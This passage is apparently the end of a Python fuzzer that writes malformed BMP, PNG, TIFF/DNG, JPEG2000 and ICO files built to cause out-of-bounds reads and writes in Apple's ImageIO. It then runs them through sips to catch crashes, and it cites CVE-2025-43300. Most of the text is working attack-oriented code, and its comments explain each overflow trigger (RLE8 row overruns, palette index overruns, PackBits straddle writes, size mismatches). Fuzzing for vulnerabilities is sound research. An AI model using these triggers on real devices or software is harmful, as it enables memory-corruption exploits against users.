         build_bmp(64, 64, bpp=8)),
        # biSizeImage=4 but actual data needs 4096*4096*4 = 64MB (OOB read on decode)
        ('bmp_size_mismatch_4096x4096_32bpp',
         build_bmp(4096, 4096, bpp=32, bi_size_image_override=4)),
        # Large width: stride = ((0x15555556*24+31)//32)*4 overflows 32-bit at 0x15555556*24
        ('bmp_bigwidth_rgb24_1row',
         build_bmp(0x15555556, 1, bpp=24)),
        # Large width: 8-bit stride overflow
        ('bmp_bigwidth_gray8_1row',
         build_bmp(0x40000001, 1, bpp=8)),
        # biSizeImage=0 (auto), width/height large → correct stride but tiny pixel data in file
        ('bmp_big_dims_no_data',
         build_bmp(0x10000, 0x10000, bpp=32, bi_size_image_override=0)),
        # BI_RLE8: RLE stream encodes height+4 rows, biHeight=64 → OOB write of 64*4=256 bytes
        ('CTRL_bmp_rle8_64x64',
         build_bmp_rle8_overflow(64, 64, extra_rows=0)),
        ('bmp_rle8_overflow_4rows',
         build_bmp_rle8_overflow(64, 64, extra_rows=4)),
        ('bmp_rle8_overflow_64rows',
         build_bmp_rle8_overflow(64, 64, extra_rows=64)),
        ('bmp_rle8_overflow_256rows',
         build_bmp_rle8_overflow(256, 256, extra_rows=256)),
    ]
    print('\n[*] NEW TARGET: BMP overflow / biSizeImage mismatch / BI_RLE8 OOB:')
    for name, data in bmp_cases:
        fname = os.path.join(outdir, f'{name}.bmp')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    # ---- NEW TARGET: PNG palette OOB / dimension mismatch ----
    # Apple's PNGImagePlugin — covers both libpng and any custom post-processing.
    # Palette OOB: PLTE has N entries, pixel data uses indices >> N-1.
    # Dimension mismatch: IHDR declares large image, IDAT compressed stream is tiny.
    png_cases = [
        # CTRL: valid 256-color indexed PNG (confirm PNG path is reachable)
        ('CTRL_png_indexed_256color',
         build_png_palette_oob(64, 64, palette_entries=256, oob_index=100)),
        # OOB READ: 4-entry PLTE but pixels use index 200 (200 × 3 = byte 600 in 12-byte PLTE)
        ('png_palette_oob_4ent_idx200',
         build_png_palette_oob(64, 64, palette_entries=4, oob_index=200)),
        ('png_palette_oob_4ent_idx255',
         build_png_palette_oob(256, 256, palette_entries=4, oob_index=255)),
        # OOB READ: 1-entry PLTE (3 bytes), pixel index 255 → 765 bytes past PLTE start
        ('png_palette_oob_1ent_idx255',
         build_png_palette_oob(64, 64, palette_entries=1, oob_index=255)),
        # Dimension mismatch: IHDR=4096x4096 RGB, IDAT only has 4 rows
        # Row-filter reconstruction at row 5+ reads past decompressed buffer
        ('png_dim_mismatch_4096x4096_4rows',
         build_png_dimension_mismatch(4096, 4096, actual_rows=4, color_type=2)),
        ('png_dim_mismatch_1024x1024_1row',
         build_png_dimension_mismatch(1024, 1024, actual_rows=1, color_type=2)),
        # Dimension mismatch with grayscale (1-channel, less data → larger relative OOB)
        ('png_dim_mismatch_4096x4096_gray_4rows',
         build_png_dimension_mismatch(4096, 4096, actual_rows=4, color_type=0)),
        # tEXt chunk with declared length 0x7FFFFFFF (OOM/stream-OOB attack)
        ('png_text_chunk_2gb_declared',
         build_png_text_chunk_overflow(8, 8)),
    ]
    print('\n[*] NEW TARGET: PNG palette OOB / dimension mismatch / text chunk overflow:')
    for name, data in png_cases:
        fname = os.path.join(outdir, f'{name}.png')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    # ---- NEW TARGET: TIFF + Deflate decompressed size overflow ----
    # TIFF strip with Deflate (compression=32946).
    # CTRL: decompressed size == width*height*spp*bps/8 (exact match).
    # Attack: strip decompresses to more data than declared image size.
    # A decoder that decompresses without capping output writes past the output buffer.
    deflate_cases = [
        ('CTRL_tiff_deflate_64x64_3spp',
         build_tiff_deflate_overflow(64, 64, spp=3, extra_bytes=0)),
        ('CTRL_tiff_deflate_64x64_1spp',
         build_tiff_deflate_overflow(64, 64, spp=1, extra_bytes=0)),
        # OOB WRITE: decompressed data overflows output buffer by 1MB
        ('tiff_deflate_overflow_1mb',
         build_tiff_deflate_overflow(64, 64, spp=3, extra_bytes=1 * 1024 * 1024)),
        ('tiff_deflate_overflow_4mb',
         build_tiff_deflate_overflow(64, 64, spp=3, extra_bytes=4 * 1024 * 1024)),
        ('tiff_deflate_overflow_16mb',
         build_tiff_deflate_overflow(64, 64, spp=3, extra_bytes=16 * 1024 * 1024)),
        # Larger image base with overflow (wider OOB region, less likely to be caught early)
        ('tiff_deflate_256x256_overflow_4mb',
         build_tiff_deflate_overflow(256, 256, spp=3, extra_bytes=4 * 1024 * 1024)),
    ]
    print('\n[*] NEW TARGET: TIFF + Deflate decompressed size overflow:')
    for name, data in deflate_cases:
        fname = os.path.join(outdir, f'{name}.dng')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    # ---- NEW TARGET: Plain TIFF + JPEG2000 (compression=34712) SPP/Csiz mismatch ----
    # No DNG tags → no Camera Raw routing. Tests the TIFF plugin's J2K sub-decoder.
    # If Apple supports TIFF+J2K, a Csiz mismatch is the same bug class as CVE-2025-43300.
    plain_j2k_cases = [
        ('CTRL_plain_tiff_j2k_3spp_3csiz',
         build_plain_tiff_j2k(64, 64, spp=3, inner_csiz=3)),
        ('CTRL_plain_tiff_j2k_1spp_1csiz',
         build_plain_tiff_j2k(64, 64, spp=1, inner_csiz=1)),
        # OOB READ: spp=3 outer, Csiz=1 inner
        ('plain_tiff_j2k_3spp_1csiz',
         build_plain_tiff_j2k(64, 64, spp=3, inner_csiz=1)),
        ('plain_tiff_j2k_3spp_1csiz_256',
         build_plain_tiff_j2k(256, 256, spp=3, inner_csiz=1)),
        # OOB WRITE: spp=1 outer, Csiz=3 inner
        ('plain_tiff_j2k_1spp_3csiz',
         build_plain_tiff_j2k(64, 64, spp=1, inner_csiz=3)),
        ('plain_tiff_j2k_1spp_4csiz',
         build_plain_tiff_j2k(64, 64, spp=1, inner_csiz=4)),
    ]
    print('\n[*] NEW TARGET: Plain TIFF + JPEG2000 SPP/Csiz mismatch (no Camera Raw):')
    for name, data in plain_j2k_cases:
        fname = os.path.join(outdir, f'{name}.dng')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    # ---- ROUND 5: TIFF + PackBits straddle-boundary OOB write ----
    # PackBits is a simpler algorithm than Deflate.  The per-run outer-bound check
    # is a known vulnerability pattern: decoders check output_ptr < buffer_end before
    # each RUN but not before each BYTE inside a run.  The straddle attack exploits this.
    packbits_cases = [
        # CTRL: exact size (valid PackBits, confirm path is reachable)
        ('CTRL_tiff_packbits_64x64_3spp',
         build_tiff_packbits(64, 64, spp=3, straddle_extra=0)),
        ('CTRL_tiff_packbits_64x64_1spp',
         build_tiff_packbits(64, 64, spp=1, straddle_extra=0)),
        # Single-strip straddle: last run extends 1..127 bytes past output buffer end
        ('tiff_packbits_straddle_1b',
         build_tiff_packbits(64, 64, spp=3, straddle_extra=1)),
        ('tiff_packbits_straddle_127b',
         build_tiff_packbits(64, 64, spp=3, straddle_extra=127)),
        # Larger image — larger buffer between straddle and next allocation
        ('tiff_packbits_straddle_127b_256',
         build_tiff_packbits(256, 256, spp=3, straddle_extra=127)),
        # Multi-strip straddle: one straddle per row (64 × 127 = 8128 bytes total OOB)
        ('tiff_packbits_multistrip_straddle',
         build_tiff_packbits_multistrip_straddle(64, 64, spp=3)),
        ('tiff_packbits_multistrip_straddle_256',
         build_tiff_packbits_multistrip_straddle(256, 256, spp=3)),
    ]
    print('\n[*] ROUND 5: TIFF + PackBits straddle-boundary OOB write:')
    for name, data in packbits_cases:
        fname = os.path.join(outdir, f'{name}.dng')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    # ---- ROUND 5: ICO format mismatch (directory vs embedded image dimensions) ----
    # ICO is a container for one or more BMP/PNG images.  The ICONDIRENTRY declares
    # image dimensions; the embedded BMP/PNG may declare different ones.
    # If Apple's ICO decoder allocates based on ICONDIRENTRY and passes that buffer
    # to the sub-decoder (PNG/BMP), the sub-decoder writes past the end → OOB write.
    ico_cases = [
        # CTRL: ICO with matching 64x64 embedded PNG (confirm ICO path reachable)
        ('CTRL_ico_png_64x64',
         build_ico_ctrl(64, 64)),
        # PNG mismatch: ICO says 32x32, embedded PNG IHDR says 4096x4096
        ('ico_png_mismatch_32ico_4096png',
         build_ico_png_mismatch(ico_width=32, ico_height=32,
                                 png_width=4096, png_height=4096)),
        ('ico_png_mismatch_32ico_1024png',
         build_ico_png_mismatch(ico_width=32, ico_height=32,
                                 png_width=1024, png_height=1024)),
        # ICO declares 256x256 (0x0 in ICO = 256), PNG says 4096x4096
        ('ico_png_mismatch_256ico_4096png',
         build_ico_png_mismatch(ico_width=256, ico_height=256,
                                 png_width=4096, png_height=4096)),
        # BMP mismatch: ICO says 32x32, embedded BMP DIB says 4096x4096
        ('ico_bmp_mismatch_32ico_4096bmp',
         build_ico_bmp_mismatch(ico_width=32, ico_height=32,
                                 bmp_width=4096, bmp_height=4096)),
    ]
    print('\n[*] ROUND 5: ICO format mismatch (directory vs embedded image):')
    for name, data in ico_cases:
        fname = os.path.join(outdir, f'{name}.ico')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    print(f'\n[+] Corpus ready.')


# ========================== macOS tester ==========================

def test_corpus(outdir='corpus'):
    """Run all corpus files through macOS sips (ImageIO). macOS only."""
    if sys.platform != 'darwin':
        print('[!] --test-corpus requires macOS.')
        return

    files = sorted(f for f in os.listdir(outdir) if f.endswith('.dng'))
    print(f'[*] Testing {len(files)} files via sips (forced decode to PNG)...\n')
    crashes, hangs, ok = [], [], []

    for fname in files:
        path = os.path.join(outdir, fname)
        try:
            r = subprocess.run(
                ['sips', '-s', 'format', 'png', path, '--out', '/tmp/sips_out.png'],
                capture_output=True, text=True, timeout=30,
                env={**os.environ,
                     'MallocScribble': '1',
                     'MallocGuardEdges': '1'},
            )
            if r.returncode != 0:
                crashes.append((fname, r.returncode, r.stderr.strip()))
                print(f'  [CRASH rc={r.returncode}] {fname}')
                if r.stderr:
                    print(f'    {r.stderr.strip()[:120]}')
            else:
                ok.append(fname)
                print(f'  [  ok ] {fname}')
        except subprocess.TimeoutExpired:
            hangs.append(fname)
            print(f'  [ HANG] {fname}')

    print(f'\n--- Results: ok={len(ok)}  crash={len(crashes)}  hang={len(hangs)} ---')
    if crashes:
        print('\n[!] Findings (crashes / decode errors):')
        for f, rc, err in crashes:
            print(f'    {f}  rc={rc}  {err[:80]}')
    if hangs:
        print('\n[!] Hangs:')
        for f in hangs:
            print(f'    {f}')


# ========================== Entry point ==========================

def main():
    ap = argparse.ArgumentParser(
        description='DNG+JPEGL/JPEGLS/J2K metadata mismatch fuzzer for Apple ImageIO'
    )
    ap.add_argument('--out',    default='trigger.dng')
    ap.add_argument('--codec',  default='jpegl',
                    choices=['j2k', 'jpegls', 'jpegl', 'uncompressed'])
    ap.add_argument('--photo',  default='cfa',
                    choices=['cfa', 'linear'],
                    help='PhotometricInterpretation: cfa=32803, linear=34892')
    ap.add_argument('--width',  type=int, default=64)
    ap.add_argument('--height', type=int, default=64)
    ap.add_argument('--spp',    type=int, default=1,
                    help='TIFF SamplesPerPixel (outer metadata)')
    ap.add_argument('--inner',  type=int, default=3,
                    help='Inner codec component count (inner metadata, > spp → OOB write)')
    ap.add_argument('--bits',   type=int, default=16)
    ap.add_argument('--corpus', action='store_true',
                    help='Generate full test corpus')
    ap.add_argument('--test-corpus', action='store_true',
                    help='Test corpus via sips (macOS only)')
    args = ap.parse_args()

    codec_map = {
        'j2k': COMP_JPEG2000, 'jpegls': COMP_JPEG_LS,
        'jpegl': COMP_JPEG_LOSSLESS, 'uncompressed': COMP_UNCOMPRESSED,
    }
    photo_map = {'cfa': PHOTO_CFA, 'linear': PHOTO_LINEAR_RAW}

    if args.corpus:
        generate_corpus()
        return
    if args.test_corpus:
        test_corpus()
        return

    build_dng(args.width, args.height,
              spp=args.spp, inner_comps=args.inner,
              bits=args.bits,
              codec=codec_map[args.codec],
              photometric=photo_map[args.photo],
              outfile=args.out)


if __name__ == '__main__':
    main()
